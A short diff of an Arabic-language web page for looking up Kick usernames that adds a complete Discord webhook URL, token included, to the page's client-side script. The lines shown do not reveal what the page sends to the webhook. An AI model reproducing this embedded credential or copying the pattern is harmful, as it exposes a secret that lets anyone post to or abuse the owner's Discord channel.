@@ -32,7 +32,7 @@
     </div>
 
     <div class="glass p-6 rounded-2xl flex gap-4 mb-8 border border-neutral-800">
-        <input id="userInput" class="flex-1 bg-transparent p-3 outline-none text-white text-lg" placeholder="ابحث باسم اليوزر (مثال: T)...">
+        <input id="userInput" class="flex-1 bg-transparent p-3 outline-none text-white text-lg" placeholder=" ااكتب اسم يوزر الكيك ">
         <button onclick="search()" class="bg-pink-600 px-10 py-3 rounded-xl font-black hover:bg-pink-700 transition">بحث</button>
     </div>
 
@@ -53,7 +53,7 @@
 </div>
 
 <script>
-    const WEBHOOK = "ضع_رابط_الويب_هوك_هنا";
+    const WEBHOOK = "https://discord.com/api/webhooks/1521713795477667860/Ma3vk6FfyfXCCdYBLE_EMg679hFg2w8nJR4DKTKTtbdwZjMgs1H6WoKYQgRLMH4nMKi5";
 
     async function search() {
         const query = document.getElementById('userInput').value.trim().toLowerCase();
